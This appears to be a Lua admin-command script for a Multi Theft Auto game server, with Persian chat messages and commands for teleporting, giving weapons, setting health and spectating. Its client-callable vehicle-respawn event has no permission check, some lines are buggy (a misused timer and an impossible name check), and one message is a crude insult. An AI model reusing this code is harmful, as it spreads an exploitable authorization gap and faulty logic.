--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("getvowner",
function ( thePlayer, command )
 if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 1 then
	if getElementData(thePlayer,"ingetownermode") == true then
		setElementData(thePlayer,"ingetownermode",nil)
		outputChatBox("#ff0000Shoma Emkan Didan Saheb Khodro Ra Off Kardid!", thePlayer, 255, 255, 255, true)
	else
		setElementData(thePlayer,"ingetownermode",true)
		outputChatBox("#00ff00Shoma Emkan Didan Saheb Khodro Ra On Kardid!", thePlayer, 255, 255, 255, true)
	end
 end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("discord",
function ( thePlayer, command )
	if getElementData(thePlayer,"spmaeddiscord") == true then
		setElementData(thePlayer,"spmaed",nil)
		outputChatBox("#ff0000discord.gg/EnAp2PfB!", thePlayer, 255, 255, 255, true)
	else
		setTimer (setElementData(thePlayer,"spmaed",true), 3000, 1 )
	end

end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("getcarpos",
function ( thePlayer, command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 2 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	if isPedInVehicle(thePlayer) then
		local veh = getPedOccupiedVehicle (thePlayer)
		local x,y,z = getElementPosition( veh )
		local rotx,roty,rotz = getElementRotation ( veh )
		outputChatBox("#43C67AMokhtasat Car: ("..x.." ,"..y .." ,"..z..")", thePlayer, 150, 150 , 150,true)
		outputChatBox("#43C67ARotation Car: ("..rotx.." ,"..roty.." ,"..rotz..")", thePlayer, 150, 150 , 150,true)
	else
		outputChatBox("#ff0000[Error]: #ffffffBayad Dar Mashin Bashid!", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim

addCommandHandler("afill",
function ( thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local veh = getPedOccupiedVehicle (thePlayer)
	setElementData(veh,"fuel",100)
end)
--___________________________________________________________________________________________________________________--#ExoPrim

addCommandHandler("setfill",
function ( thePlayer, command, benzin)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local veh = getPedOccupiedVehicle (thePlayer)
	setElementData(veh,"fuel",benzin)
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim

addCommandHandler("gunrv",
function (thePlayer)
	if getElementData(thePlayer, "loggedIn") == true then
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 10 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
        triggerClientEvent(thePlayer,"gunrv:enableOrDisable",resourceRoot)
end
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addEvent("gunrv:respawnVehicle",true)
addEventHandler("gunrv:respawnVehicle",root,
function (car)
    if isElement(car) and getElementType(car) == "vehicle" then
	    respawnVehicle(car)
	end
end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("gg",
	function ( thePlayer, command, player, weapon, tir )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 8 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local tir = tonumber(tir)
		local weapon = tonumber(weapon)
		local esmGun = getWeaponNameFromID(weapon)
		if player then
			local find = miscSys:findPlayer ( player )
			if find then
				if weapon then
					if tir then
						local targetPlayer = getPlayerName ( find )
						giveWeapon(find, weapon, tir)
						SendDiscordLog("GiveGunLog", thePlayer , command, weapon,find )
						outputChatBox("#00ff00[Done]: #ffffffShoma Be #00ff00"..targetPlayer.."#ffffff "..esmGun.. " Ba ("..tir..") Tir Dadid!", thePlayer, 0, 255, 0,true)
						outputChatBox("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Be Shoma #ffffff"..esmGun.."("..tir..") #00ff00Dad!", find, 0, 255, 0,true)
					else
						outputChatBox("#ff0000[Error]: #ffffffTedad Tir Ra Vared Konid!", thePlayer, 255, 0, 0, true)
					end
				else
					outputChatBox("#ff0000[Error]: #ffffffGun ID Ra Vared Konid!", thePlayer, 255, 0, 0, true)
				end
			else
				outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Syntax: /gg <PartOfName/ID> <Gun-ID> <Tir>", thePlayer, 255, 0, 0, true)
		end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("gunpack",
function ( thePlayer, command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 1 then
		giveWeapon(thePlayer, 31, 100)
		giveWeapon(thePlayer, 34, 100)
		giveWeapon(thePlayer, 32, 100)
		giveWeapon(thePlayer, 23, 100)
		outputChatBox("#00ff00[Done]: #ffffffShoma Ba Movafaghiat Pack Gun Daryaft Kardid.", thePlayer, 0, 255, 0,true)
		AdminMessages("Gun-System","Admin #6600CC"..getPlayerName(thePlayer).." #FFFFFFAz Gun Pack Estefade Kard.")
	else
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("slapp",
	function ( thePlayer, command, player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		local find = miscSys:findPlayer ( player )
		if player then
		if find then
		local x,y,z = getElementPosition(find)
			removePedFromVehicle( find )
			setElementPosition ( find, x,y,z+5 )
			outputChatBox("#00ff00[Done]: #ffffffShoma #00ff00"..getPlayerName(find).." #ffffffRa Slap Kardid!", thePlayer ,255, 255, 255, true)
			outputChatBox("#ff0000[Tavajoh] #ffffffAdmin "..getPlayerName(thePlayer).." Shoma Ra Slap Kard!", find, 255, 255, 255, true)
		else
			outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Syntax: /slapp <PartOfName/ID>", thePlayer, 255, 0, 0, true)
		end	
	end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("takegun",
	function ( thePlayer, command, player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 3 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end
		if player then
			local find = miscSys:findPlayer ( player )
		if find then
			takeAllWeapons (find)
			outputChatBox("#00ff00[Done]: #ffffffShoma Aslahe Haye #00ff00"..getPlayerName(find).." #ffffffRa Take Kardid!", thePlayer ,255, 255, 255, true)
			outputChatBox("#ff0000Admin "..getPlayerName(thePlayer).." Tamamie Aslahe Haye Shoma Ra Gereft!", find, 255, 255, 255, true)
		else
			outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
		end
		else
			outputChatBox("#C0C0C0Syntax: /takegun <PartOfName/ID>", thePlayer, 255, 0, 0, true)
		end	
	end
)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
addCommandHandler("sethp",
	function ( thePlayer, command, player, hp )
		local find = miscSys:findPlayer ( player )
		if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
			outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
			return false
		end


		if player then
		if find then
		if hp then
			if getPlayerName(find) == "ExoPrim" and getPlayerName(find) == "pinki" and getPlayerName(thePlayer) ~= "ExoPrim"  then
				outputChatBox("#ff0000✖️ Vakhi Bia Sar Kiram Beshin!", thePlayer, 255, 255, 255, true)
				return false
			end
			hp = tonumber( hp )
				local targetPlayer = getPlayerName ( find )
				setElementHealth( find, hp )
				disSys:SendDiscordLog("sethealth",command,thePlayer,find,hp)
				outputChatBox("#00ff00[Done]: #ffffffShoma Health'e #00ff00"..targetPlayer.." #ffffffRa Be #00ff00"..hp.." #ffffffSet Kardid!", thePlayer, 0, 255, 0,true)
				outputChatBox("#00ff00Admin #ffffff"..getPlayerName(thePlayer).." #00ff00Health'e Shoma Ra Be #ffffff"..hp.." #00ff00Set Kard!", find, 0, 255, 0,true)
			else
				outputChatBox("#ff0000[Error]: #ffffffMeghdar Health Ra Vared Konid!", thePlayer, 255, 0, 0, true)
			end
			else
				outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
			else
				outputChatBox("#C0C0C0Syntax: /sethp <PartOfName/ID> <Value>", thePlayer, 255, 0, 0, true)
			end
		end	
	
)






addCommandHandler("gj",
function ( thePlayer, command, player )
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) > 1 then
		if player then
			local find = miscSys:findPlayer ( player )
			local targetPlayer = getPlayerName ( find )
			if find then
				if ( isPedWearingJetpack(find) ) then
					removePedJetPack(find)
					outputChatBox("#00ff00[Done]: #ffffffShoma Az #00ff00"..targetPlayer.." #ffffffJet Pack Gereftid!", thePlayer, 255, 255, 255, true)
					return
				end
				givePedJetPack(find)
				outputChatBox("#00ff00[Done]: #ffffffShoma Be #00ff00"..targetPlayer.." #ffffffJet Pack Dadid!", thePlayer, 255, 255, 255, true)
			else
				outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
			end
		else
			outputChatBox("#C0C0C0Syntax: /gj <PartOfName/ID>", thePlayer, 255, 0, 0, true)
		end
				
	else
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
	end
end)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function listPos(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	outputChatBox("#00FF00*** Teleport List ***", thePlayer, 208, 0, 15,true)	
	outputChatBox("#00FF00[ #FFFFFF/gotols | /gotolv | /gotosf #00FF00]", thePlayer, 208, 0, 15,true)		
	outputChatBox("#00FF00[ #FFFFFF/gotocv | /gotocnn | /gotoKoh #00FF00]", thePlayer, 208, 0, 15,true)
	outputChatBox("#00FF00[ #FFFFFF/goto4Rah | /gotobeach | /gotoairportls #00FF00]", thePlayer, 208, 0, 15,true)
	outputChatBox("#00FF00[ #FFFFFF/gotobus | /gotoair| /gotogarage#00FF00]", thePlayer, 208, 0, 15,true)
	outputChatBox("#00FF00[ #FFFFFF/gotobank | /gotoskin| /gotomedic#00FF00]", thePlayer, 208, 0, 15,true)
end
addCommandHandler("gotolist", listPos)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function chilliand(thePlayer,command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	disSys:SendDiscordLog("goto",command,thePlayer)
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, -2317.8091, -1637.5575, 483.7031 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, -2317.8091, -1637.5575, 483.7031 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Koh Sf#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotokoh", chilliand)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Garage(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 909.5458984375 ,-1218.9345703125 ,16.9765625 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 909.5458984375 ,-1218.9345703125 ,16.9765625 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Garage#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotogarage", Garage)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Bank(thePlayer,command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	disSys:SendDiscordLog("goto",command,thePlayer)
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1462.9921875 ,-1017.97265625 ,25.254119873047 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1462.9921875 ,-1017.97265625 ,25.254119873047 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Bank#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotobank", Bank)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Medic(thePlayer,command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	disSys:SendDiscordLog("goto",command,thePlayer)
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 2025.74609375 ,-1423.2568359375 ,16.9921875 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 2025.74609375 ,-1423.2568359375 ,16.9921875 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Medic#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotomedic", Medic)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Skinshop(thePlayer,command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	disSys:SendDiscordLog("goto",command,thePlayer)
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 457.314453125 ,-1501.7353515625 ,31.036462783813 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 457.314453125 ,-1501.7353515625 ,31.036462783813 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 SkinShop#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotoskin", Skinshop)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function ls(thePlayer,command)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	disSys:SendDiscordLog("goto",command,thePlayer)
	if isPedInVehicle (thePlayer) then
		local theVehicle = getPedOccupiedVehicle ( thePlayer )
		setElementPosition ( theVehicle, 1529.6, -1691.2, 13.3 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1529.6, -1691.2, 13.3 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Los Santos#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotols", ls)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function bus(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1802.0478515625, -2053.96875, 13.565423965454)
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1802.0478515625, -2053.96875, 13.565423965454 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Bus#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotobus", bus)


function air(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 	then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1770.0341796875, -2435.0341796875, 13 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1770.0341796875, -2435.0341796875, 13)
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 AirPort Ls#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotoair", air)



function trucker(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1 then
		outputChatBox("#ff0000✖️ Shoma Dastresi Be In Dastoor Ra Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, -72.2470703125 ,-1134.4404296875 ,1.078125 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, -72.2470703125 ,-1134.4404296875 ,1.078125 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Trucker Job#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gototu", trucker)

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function lv(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 1  then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1699.2, 1435.1, 10.7 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1699.2, 1435.1, 10.7 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Las Venturas#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotolv", lv)

--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Sf(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 3 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, -1492.75, 710.43, 7.18 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, -1492.75, 710.43, 7.18 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Sf#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotosf", Sf)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Sin(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 11 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1078.3564453125 ,-771.7021484375 ,107.87999725342 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1078.3564453125 ,-771.7021484375 ,107.87999725342 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Sin#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotosin", Sin)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function Sin2(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, -2437.935546875 ,138.958984375 ,34.953125 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, -2437.935546875 ,138.958984375 ,34.953125 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Sin2#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotosin2", Sin2)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function civil(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1553.9111328125, -1790.5200195313, 13.546875 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1553.9111328125, -1790.5200195313, 13.546875 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Civilian#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotocv", civil)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function adver(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1210.1376953125, -1750.841796875, 13.593784332275 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1210.1376953125, -1750.841796875, 13.593784332275 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 CNN#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotocnn", adver)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function beach(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 343.20026, -1780.60388, 5.22299 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 343.20026, -1780.60388, 5.22299 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 Beach#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotobeach", beach)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function temple(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1361.00, -1036.43, 26.14 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1361.00, -1036.43, 26.14 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00ff00[Done]: #ffffffShoma Be#ff1010 4Rah Ls#ffffff Goto Shodid!", thePlayer, 255, 255, 255, true)
end
addCommandHandler("goto4rah", temple)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function airportls(thePlayer)
	if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 6 then
		outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
		return false
	end
	local theVehicle = getPedOccupiedVehicle ( thePlayer )
	if isPedInVehicle (thePlayer) then
		setElementPosition ( theVehicle, 1642.098754,-2238.430419,13.497852 )
		setElementInterior( theVehicle, 0)
		setElementDimension( theVehicle, 0)
	else
		setElementPosition ( thePlayer, 1642.098754,-2238.430419,13.497852 )
		setElementInterior( thePlayer, 0)
		setElementDimension( thePlayer, 0)
	end
		outputChatBox("#00FF00You Have Been Teleported To Air Port LS", thePlayer, 255, 255, 255, true)
end
addCommandHandler("gotoairportls", airportls)
--___________________________________________________________________________________________________________________--#ExoPrim
--___________________________________________________________________________________________________________________--#ExoPrim
function specPlayer ( thePlayer, command, player )
    if tonumber(getElementData(accSys:getPlayerAcc(thePlayer), "pAdmin")) < 5 then
      outputChatBox("#ff0000Shoma Dastresi Be In Dastoor Nadarid!", thePlayer, 255, 255, 255, true)
      return false
    end
    local find = miscSys:findPlayer ( player )
	if player then
    if find then
	if getElementData(thePlayer, "inSpect") ~= true then
		setCameraTarget(thePlayer, find)
		setElementData(thePlayer, "inSpect", true)
		outputChatBox("#00ff00Shoma Roye "..getPlayerName(find).." Spectate Shodid!", thePlayer, 255, 255, 255, true)
	else
		outputChatBox("#ff0000[Error]: #ffffffShoma Dar Halate Spectate Hastid, Use: (/spcoff)", thePlayer, 255, 255, 255, true)
	end
	else
		outputChatBox("#ff0000[Error]: #ffffffPlayer Peyda Nashod!", thePlayer, 255, 255, 255, true)
    end
    else
		outputChatBox("#C0C0C0Syntax: /specp <PartOfName/ID>", thePlayer, 255, 255, 255, true)
    end
end
addCommandHandler("spc", specPlayer )
